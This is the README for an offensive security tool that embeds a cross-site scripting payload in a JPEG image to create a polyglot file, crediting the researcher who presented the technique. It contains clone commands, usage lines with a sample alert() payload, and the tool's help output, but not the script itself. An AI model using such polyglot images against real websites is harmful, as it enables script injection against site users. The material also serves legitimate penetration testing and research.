XSS Injection in JPEG
===
All contribution goes to [@medusa_0xf](https://twitter.com/medusa_0xf). This script implements what medusa presented [here](https://twitter.com/medusa_0xf/status/1512301446271680517)

### Installation
```
git clone https://github.com/js-on/jpeg_polyglot_xss.git
cd jpeg_polyglot_xss/
```

### Usage
- Read payload from stdin: `python3 exploit.py -i test.jpeg -o injected.jpeg -pr '*/=alert("XSS")/*'`
- Read payload from file: `python3 exploit.py -i test.jpeg -o injected.jpeg -pf payload`

### Help
```
usage: exploit.py [-h] [-pf PAYLOAD_FILE] [-pr PAYLOAD_READ] -i INPUT -o OUTPUT

options:
  -h, --help            show this help message and exit
  -pf PAYLOAD_FILE, --payload-file PAYLOAD_FILE
                        Path to text file with payload
  -pr PAYLOAD_READ, --payload-read PAYLOAD_READ
                        Payload
  -i INPUT, --input INPUT
                        Input file (JPEG)
  -o OUTPUT, --output OUTPUT
                        Output file (JPEG)
```